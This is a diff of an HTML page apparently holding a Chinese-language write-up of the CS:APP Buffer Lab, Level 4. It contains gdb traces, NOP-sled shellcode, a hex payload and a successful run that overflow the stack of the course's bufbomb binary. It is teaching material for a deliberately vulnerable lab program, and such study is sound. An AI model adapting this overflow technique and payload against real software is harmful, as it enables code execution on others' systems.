-Dump of assembler code for function getbufn:
-   0x0804920c &lt;+0&gt;:     push   %ebp
-   0x0804920d &lt;+1&gt;:     mov    %esp,%ebp
-   0x0804920f &lt;+3&gt;:     sub    $0x218,%esp
-   0x08049215 &lt;+9&gt;:     lea    -0x208(%ebp),%eax
-   0x0804921b &lt;+15&gt;:    mov    %eax,(%esp)
-   0x0804921e &lt;+18&gt;:    call   0x8048cfa &lt;Gets&gt;
-   0x08049223 &lt;+23&gt;:    mov    $0x1,%eax
-   0x08049228 &lt;+28&gt;:    leave
-   0x08049229 &lt;+29&gt;:    ret
-End of assembler dump.
-(gdb) b *0x0804921b
-Breakpoint 1 at 0x804921b
-(gdb) r -u bovik -n
-Starting program: /root/csapp/04Buffer Lab (IA32)/buflab-handout/bufbomb -u bovik -n
-Userid: bovik
-Cookie: 0x1005b2b7
-
-Breakpoint 1, 0x0804921b in getbufn ()
-(gdb) info r eax
-eax            0x556833a8       1432892328
-(gdb) c
-Continuing.
-Type string:a
-Dud: getbufn returned 0x1
-Better luck next time
-
-Breakpoint 1, 0x0804921b in getbufn ()
-(gdb) info r eax
-eax            0x55683378       1432892280
-(gdb) c
-Continuing.
-Type string:a
-Dud: getbufn returned 0x1
-Better luck next time
-
-Breakpoint 1, 0x0804921b in getbufn ()
-(gdb) info r eax
-eax            0x556833d8       1432892376
-(gdb) c
-Continuing.
-Type string:a
-Dud: getbufn returned 0x1
-Better luck next time
-
-Breakpoint 1, 0x0804921b in getbufn ()
-(gdb) info r eax
-eax            0x55683368       1432892264
-(gdb) c
-Continuing.
-Type string:a
-Dud: getbufn returned 0x1
-Better luck next time
-
-Breakpoint 1, 0x0804921b in getbufn ()
-(gdb) info r eax
-eax            0x55683358       1432892248
-(gdb) c
-Continuing.
-Type string:a
-Dud: getbufn returned 0x1
-Better luck next time
-[Inferior 1 (process 11263) exited normally]</code></pre><p>可以得到五次地址分别是 <code>0x556833a8</code> <code>0x55683378</code> <code>0x556833d8</code> <code>0x55683368</code> <code>0x55683358</code>,偏移范围是0x80</p><p>注意到本次缓冲区的长度是0x208(520字节),所以缓冲区的长度大于栈地址的偏移范围,所以我们可以将将返回地址设定为一个最大的栈起始地址,缓冲区全部使用nop指令,滑落到栈底(栈空间中的高位地址),然后执行我们的攻击代码</p><p>同时ebp的值虽然不确定,但是可以通过前后汇编得到ebp和esp的关系是ebp = esp+0x28</p><p>修改返回值eax为cookie,记录testn调用getbufn的返回地址<code>0x08048e3a</code>,所以可以构造攻击汇编代码</p><pre><code class="language-x86asm">lea 0x28(%esp),%ebp
+88 35 68 55</code></pre><pre class="language-shell"><code><span class="Token VARIANT">$</span><span class="Token SPACE"> </span><span class="Token Program PATH">./hex2raw</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token SPACE"> </span><span class="Token NUMBER">3.</span><span class="Token ID">txt</span><span class="Token SPACE"> </span><span class="Token PIPE">|</span><span class="Token SPACE"> </span><span class="Token Program PATH">./bufbomb</span><span class="Token SPACE"> </span><span class="Token OPTION">-u</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Userid:</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Cookie:</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:Boom</span><span class="Token BANG">!</span><span class="Token COLON">:</span><span class="Token SPACE"> </span><span class="Token ID">getbuf</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">VALID</span><span class="Token LF">
+</span><span class="Token Program ID">NICE</span><span class="Token SPACE"> </span><span class="Token ID">JOB</span><span class="Token BANG">!</span></code></pre><h3 id="h3-7">Level4</h3><p>本关就是栈地址的随机化,有一个+-240的偏差,所以不能准确的指定到某一个地址. 我们可以打一个断点来查看五次调用的时候的栈起始地址</p><pre class="language-shell"><code><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">disas</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token LF">
+</span><span class="Token Program ID">Dump</span><span class="Token SPACE"> </span><span class="Token ID">of</span><span class="Token SPACE"> </span><span class="Token ID">assembler</span><span class="Token SPACE"> </span><span class="Token ID">code</span><span class="Token SPACE"> </span><span class="Keyword Token FOR">for</span><span class="Token SPACE"> </span><span class="Token ID">function</span><span class="Token SPACE"> </span><span class="Token ID">getbufn:</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x0804920c</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">0</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">push</span><span class="Token SPACE">   </span><span class="Token MOD">%</span><span class="Token ID">ebp</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x0804920d</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">1</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">mov</span><span class="Token SPACE">    </span><span class="Token MOD">%</span><span class="Token ID">esp</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">ebp</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x0804920f</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">3</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">sub</span><span class="Token SPACE">    </span><span class="Token VARIANT">$0x218</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">esp</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08049215</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">9</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">     </span><span class="Token Program ID">lea</span><span class="Token SPACE">    </span><span class="Token OPTION">-0x208</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token MOD">%</span><span class="Token ID">ebp</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x0804921b</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">15</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">    </span><span class="Token Program ID">mov</span><span class="Token SPACE">    </span><span class="Token MOD">%</span><span class="Token ID">eax</span><span class="Token COMMA">,</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token MOD">%</span><span class="Token ID">esp</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x0804921e</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">18</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">    </span><span class="Token Program ID">call</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x8048cfa</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token ID">Gets</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08049223</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">23</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">    </span><span class="Token Program ID">mov</span><span class="Token SPACE">    </span><span class="Token VARIANT">$0x1</span><span class="Token COMMA">,</span><span class="Token MOD">%</span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08049228</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">28</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">    </span><span class="Token Program ID">leave</span><span class="Token LF">
+</span><span class="Token SPACE">   </span><span class="Token NUMBER">0x08049229</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token PLUS">+</span><span class="Token NUMBER">29</span><span class="Token REDIRECT_TO">&gt;</span><span class="Token COLON">:</span><span class="Token SPACE">    </span><span class="Token Program ID">ret</span><span class="Token LF">
+</span><span class="Token Program ID">End</span><span class="Token SPACE"> </span><span class="Token ID">of</span><span class="Token SPACE"> </span><span class="Token ID">assembler</span><span class="Token SPACE"> </span><span class="Token ID">dump.</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">b</span><span class="Token SPACE"> </span><span class="Token MUL">*</span><span class="Token NUMBER">0x0804921b</span><span class="Token LF">
+</span><span class="Token Program ID">Breakpoint</span><span class="Token SPACE"> </span><span class="Token NUMBER">1</span><span class="Token SPACE"> </span><span class="Token ID">at</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x804921b</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">r</span><span class="Token SPACE"> </span><span class="Token OPTION">-u</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token SPACE"> </span><span class="Token OPTION">-n</span><span class="Token LF">
+</span><span class="Token Program ID">Starting</span><span class="Token SPACE"> </span><span class="Token ID">program:</span><span class="Token SPACE"> </span><span class="Token PATH">/root/csapp/04Buffer</span><span class="Token SPACE"> </span><span class="Token Function ID">Lab</span><span class="Token SPACE"> </span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token ID">IA32</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token PATH">/buflab-handout/bufbomb</span><span class="Token SPACE"> </span><span class="Token OPTION">-u</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token SPACE"> </span><span class="Token OPTION">-n</span><span class="Token LF">
+</span><span class="Token Program ID">Userid:</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Cookie:</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token LF">
+</span><span class="Token Program ID">Breakpoint</span><span class="Token SPACE"> </span><span class="Token NUMBER">1</span><span class="Token COMMA">,</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x0804921b</span><span class="Token SPACE"> </span><span class="Keyword Token IN">in</span><span class="Token SPACE"> </span><span class="Token Function ID">getbufn</span><span class="Token SPACE"> </span><span class="brace-depth-0 Token LPAREN">(</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">info</span><span class="Token SPACE"> </span><span class="Token ID">r</span><span class="Token SPACE"> </span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token Program ID">eax</span><span class="Token SPACE">            </span><span class="Token NUMBER">0x556833a8</span><span class="Token SPACE">       </span><span class="Token NUMBER">1432892328</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">c</span><span class="Token LF">
+</span><span class="Token Program ID">Continuing.</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:a</span><span class="Token LF">
+</span><span class="Token Program ID">Dud:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1</span><span class="Token LF">
+</span><span class="Token Program ID">Better</span><span class="Token SPACE"> </span><span class="Token ID">luck</span><span class="Token SPACE"> </span><span class="Token ID">next</span><span class="Token SPACE"> </span><span class="Token ID">time</span><span class="Token LF">
+</span><span class="Token LF">
+</span><span class="Token Program ID">Breakpoint</span><span class="Token SPACE"> </span><span class="Token NUMBER">1</span><span class="Token COMMA">,</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x0804921b</span><span class="Token SPACE"> </span><span class="Keyword Token IN">in</span><span class="Token SPACE"> </span><span class="Token Function ID">getbufn</span><span class="Token SPACE"> </span><span class="brace-depth-0 Token LPAREN">(</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">info</span><span class="Token SPACE"> </span><span class="Token ID">r</span><span class="Token SPACE"> </span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token Program ID">eax</span><span class="Token SPACE">            </span><span class="Token NUMBER">0x55683378</span><span class="Token SPACE">       </span><span class="Token NUMBER">1432892280</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">c</span><span class="Token LF">
+</span><span class="Token Program ID">Continuing.</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:a</span><span class="Token LF">
+</span><span class="Token Program ID">Dud:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1</span><span class="Token LF">
+</span><span class="Token Program ID">Better</span><span class="Token SPACE"> </span><span class="Token ID">luck</span><span class="Token SPACE"> </span><span class="Token ID">next</span><span class="Token SPACE"> </span><span class="Token ID">time</span><span class="Token LF">
+</span><span class="Token LF">
+</span><span class="Token Program ID">Breakpoint</span><span class="Token SPACE"> </span><span class="Token NUMBER">1</span><span class="Token COMMA">,</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x0804921b</span><span class="Token SPACE"> </span><span class="Keyword Token IN">in</span><span class="Token SPACE"> </span><span class="Token Function ID">getbufn</span><span class="Token SPACE"> </span><span class="brace-depth-0 Token LPAREN">(</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">info</span><span class="Token SPACE"> </span><span class="Token ID">r</span><span class="Token SPACE"> </span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token Program ID">eax</span><span class="Token SPACE">            </span><span class="Token NUMBER">0x556833d8</span><span class="Token SPACE">       </span><span class="Token NUMBER">1432892376</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">c</span><span class="Token LF">
+</span><span class="Token Program ID">Continuing.</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:a</span><span class="Token LF">
+</span><span class="Token Program ID">Dud:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1</span><span class="Token LF">
+</span><span class="Token Program ID">Better</span><span class="Token SPACE"> </span><span class="Token ID">luck</span><span class="Token SPACE"> </span><span class="Token ID">next</span><span class="Token SPACE"> </span><span class="Token ID">time</span><span class="Token LF">
+</span><span class="Token LF">
+</span><span class="Token Program ID">Breakpoint</span><span class="Token SPACE"> </span><span class="Token NUMBER">1</span><span class="Token COMMA">,</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x0804921b</span><span class="Token SPACE"> </span><span class="Keyword Token IN">in</span><span class="Token SPACE"> </span><span class="Token Function ID">getbufn</span><span class="Token SPACE"> </span><span class="brace-depth-0 Token LPAREN">(</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">info</span><span class="Token SPACE"> </span><span class="Token ID">r</span><span class="Token SPACE"> </span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token Program ID">eax</span><span class="Token SPACE">            </span><span class="Token NUMBER">0x55683368</span><span class="Token SPACE">       </span><span class="Token NUMBER">1432892264</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">c</span><span class="Token LF">
+</span><span class="Token Program ID">Continuing.</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:a</span><span class="Token LF">
+</span><span class="Token Program ID">Dud:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1</span><span class="Token LF">
+</span><span class="Token Program ID">Better</span><span class="Token SPACE"> </span><span class="Token ID">luck</span><span class="Token SPACE"> </span><span class="Token ID">next</span><span class="Token SPACE"> </span><span class="Token ID">time</span><span class="Token LF">
+</span><span class="Token LF">
+</span><span class="Token Program ID">Breakpoint</span><span class="Token SPACE"> </span><span class="Token NUMBER">1</span><span class="Token COMMA">,</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x0804921b</span><span class="Token SPACE"> </span><span class="Keyword Token IN">in</span><span class="Token SPACE"> </span><span class="Token Function ID">getbufn</span><span class="Token SPACE"> </span><span class="brace-depth-0 Token LPAREN">(</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">info</span><span class="Token SPACE"> </span><span class="Token ID">r</span><span class="Token SPACE"> </span><span class="Token ID">eax</span><span class="Token LF">
+</span><span class="Token Program ID">eax</span><span class="Token SPACE">            </span><span class="Token NUMBER">0x55683358</span><span class="Token SPACE">       </span><span class="Token NUMBER">1432892248</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LPAREN">(</span><span class="Token Program ID">gdb</span><span class="brace-depth-0 Token RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">c</span><span class="Token LF">
+</span><span class="Token Program ID">Continuing.</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:a</span><span class="Token LF">
+</span><span class="Token Program ID">Dud:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1</span><span class="Token LF">
+</span><span class="Token Program ID">Better</span><span class="Token SPACE"> </span><span class="Token ID">luck</span><span class="Token SPACE"> </span><span class="Token ID">next</span><span class="Token SPACE"> </span><span class="Token ID">time</span><span class="Token LF">
+</span><span class="brace-depth-0 Token LSQUAR_PAREN">[</span><span class="Token Program ID">Inferior</span><span class="Token SPACE"> </span><span class="Token NUMBER">1</span><span class="Token SPACE"> </span><span class="Token brace-depth-1 LPAREN">(</span><span class="Token ID">process</span><span class="Token SPACE"> </span><span class="Token NUMBER">11263</span><span class="Token brace-depth-1 RPAREN">)</span><span class="Token SPACE"> </span><span class="Token ID">exited</span><span class="Token SPACE"> </span><span class="Token ID">normally</span><span class="brace-depth-0 Token RSQUAR_PAREN">]</span></code></pre><p>可以得到五次地址分别是 <code>0x556833a8</code> <code>0x55683378</code> <code>0x556833d8</code> <code>0x55683368</code> <code>0x55683358</code>,偏移范围是0x80</p><p>注意到本次缓冲区的长度是0x208(520字节),所以缓冲区的长度大于栈地址的偏移范围,所以我们可以将将返回地址设定为一个最大的栈起始地址,缓冲区全部使用nop指令,滑落到栈底(栈空间中的高位地址),然后执行我们的攻击代码</p><p>同时ebp的值虽然不确定,但是可以通过前后汇编得到ebp和esp的关系是ebp = esp+0x28</p><p>修改返回值eax为cookie,记录testn调用getbufn的返回地址<code>0x08048e3a</code>,所以可以构造攻击汇编代码</p><pre class="language-x86asm"><code>lea 0x28(%esp),%ebp
 movl $0x1005b2b7,%eax
 push $0x08048e3a
-ret</code></pre><p>字节码如下</p><pre><code class="language-txt">level4.o:     file format elf32-i386
+ret</code></pre><p>字节码如下</p><pre class="language-txt"><code>level4.o:     file format elf32-i386
 
 
 Disassembly of section .text:
@@ -194,7 +195,7 @@ Disassembly of section .text:
    0:   8d 6c 24 28             lea    0x28(%esp),%ebp
    4:   b8 b7 b2 05 10          mov    $0x1005b2b7,%eax
    9:   68 3a 8e 04 08          push   $0x8048e3a
-   e:   c3                      ret</code></pre><p>栈空间情况如下图所示</p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111023303.png" alt="20221111023303"></p><pre><code class="language-txt">90 90 90 90 90 90 90 90 90 90
+   e:   c3                      ret</code></pre><p>栈空间情况如下图所示</p><p><img src="https://raw.githubusercontent.com/learner-lu/picbed/master/20221111023303.png" alt="20221111023303"></p><pre class="language-txt"><code>90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
@@ -253,23 +254,23 @@ Disassembly of section .text:
 b7 b2 05 10 68 3a 8e 04 08 c3
 
 00 00 00 00
-d8 33 68 55</code></pre><pre><code class="language-bash">$ ./hex2raw &lt; 4.txt -n | ./bufbomb -u bovik -n
-Userid: bovik
-Cookie: 0x1005b2b7
-Type string:KABOOM!: getbufn returned 0x1005b2b7
-Keep going
-Type string:KABOOM!: getbufn returned 0x1005b2b7
-Keep going
-Type string:KABOOM!: getbufn returned 0x1005b2b7
-Keep going
-Type string:KABOOM!: getbufn returned 0x1005b2b7
-Keep going
-Type string:KABOOM!: getbufn returned 0x1005b2b7
-VALID
-NICE JOB!</code></pre></div>
+d8 33 68 55</code></pre><pre class="language-shell"><code><span class="Token VARIANT">$</span><span class="Token SPACE"> </span><span class="Token Program PATH">./hex2raw</span><span class="Token SPACE"> </span><span class="Token REDIRECT_FROM">&lt;</span><span class="Token SPACE"> </span><span class="Token NUMBER">4.</span><span class="Token ID">txt</span><span class="Token SPACE"> </span><span class="Token OPTION">-n</span><span class="Token SPACE"> </span><span class="Token PIPE">|</span><span class="Token SPACE"> </span><span class="Token Program PATH">./bufbomb</span><span class="Token SPACE"> </span><span class="Token OPTION">-u</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token SPACE"> </span><span class="Token OPTION">-n</span><span class="Token LF">
+</span><span class="Token Program ID">Userid:</span><span class="Token SPACE"> </span><span class="Token ID">bovik</span><span class="Token LF">
+</span><span class="Token Program ID">Cookie:</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:KABOOM</span><span class="Token BANG">!</span><span class="Token COLON">:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">Keep</span><span class="Token SPACE"> </span><span class="Token ID">going</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:KABOOM</span><span class="Token BANG">!</span><span class="Token COLON">:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">Keep</span><span class="Token SPACE"> </span><span class="Token ID">going</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:KABOOM</span><span class="Token BANG">!</span><span class="Token COLON">:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">Keep</span><span class="Token SPACE"> </span><span class="Token ID">going</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:KABOOM</span><span class="Token BANG">!</span><span class="Token COLON">:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">Keep</span><span class="Token SPACE"> </span><span class="Token ID">going</span><span class="Token LF">
+</span><span class="Token Program ID">Type</span><span class="Token SPACE"> </span><span class="Token ID">string:KABOOM</span><span class="Token BANG">!</span><span class="Token COLON">:</span><span class="Token SPACE"> </span><span class="Token ID">getbufn</span><span class="Token SPACE"> </span><span class="Token ID">returned</span><span class="Token SPACE"> </span><span class="Token NUMBER">0x1005b2b7</span><span class="Token LF">
+</span><span class="Token Program ID">VALID</span><span class="Token LF">
+</span><span class="Token Program ID">NICE</span><span class="Token SPACE"> </span><span class="Token ID">JOB</span><span class="Token BANG">!</span></code></pre></div>
     <div class="dir-tree"><ul><li><a href="../../md-docs/README" >README</a></li></ul><ul><li><a href="../../md-docs/01-DataLab" >01-DataLab</a></li></ul><ul><li><a href="../../md-docs/02-BombLab" >02-BombLab</a></li></ul><ul><li><a href="../../md-docs/03-AttackLab" >03-AttackLab</a></li></ul><ul><li><a href="../../md-docs/04-BufferLab" >04-BufferLab</a></li></ul><ul><li><a href="../../md-docs/05-ArchLab" >05-ArchLab</a></li></ul><ul><li><a href="../../md-docs/06-ArchY86Lab" >06-ArchY86Lab</a></li></ul><ul><li><a href="../../md-docs/07-CacheLab" >07-CacheLab</a></li></ul><ul><li><a href="../../md-docs/08-PerfLab" >08-PerfLab</a></li></ul><ul><li><a href="../../md-docs/09-ShellLab" >09-ShellLab</a></li></ul><ul><li><a href="../../md-docs/10-MallocLab" >10-MallocLab</a></li></ul><ul><li><a href="../../md-docs/11-ProxyLab" >11-ProxyLab</a></li></ul></div>
     <div class="zood"><a class="" href="https://github.com/luzhixing12345/zood" target="_blank">zood</a></div>
-    <script type="text/javascript" src="../../../js/next_front.js"></script><script>addLink("../../md-docs/03-AttackLab","../../md-docs/05-ArchLab","ab")</script><script type="text/javascript" src="../../../js/change_mode.js"></script><script>addChangeModeButton("../../../img/sun.png","../../../img/moon.png")</script><script type="text/javascript" src="../../../js/copy_code.js"></script><script>addCodeCopy("../../../img/before_copy.png","../../../img/after_copy.png")</script><script type="text/javascript" src="../../../js/navigator.js"></script><script type="text/javascript" src="../../../js/prism.js"></script><script type="text/javascript" src="../../../js/picture_preview.js"></script><script type="text/javascript" src="../../../js/global_js_configuration.js"></script>
+    <script type="text/javascript" src="../../../js/next_front.js"></script><script>addLink("../../md-docs/03-AttackLab","../../md-docs/05-ArchLab","ab")</script><script type="text/javascript" src="../../../js/change_mode.js"></script><script>addChangeModeButton("../../../img/sun.png","../../../img/moon.png")</script><script type="text/javascript" src="../../../js/copy_code.js"></script><script>addCodeCopy("../../../img/before_copy.png","../../../img/after_copy.png")</script><script type="text/javascript" src="../../../js/navigator.js"></script><script type="text/javascript" src="../../../js/picture_preview.js"></script><script type="text/javascript" src="../../../js/global_js_configuration.js"></script>
 </body>
 
 </html>
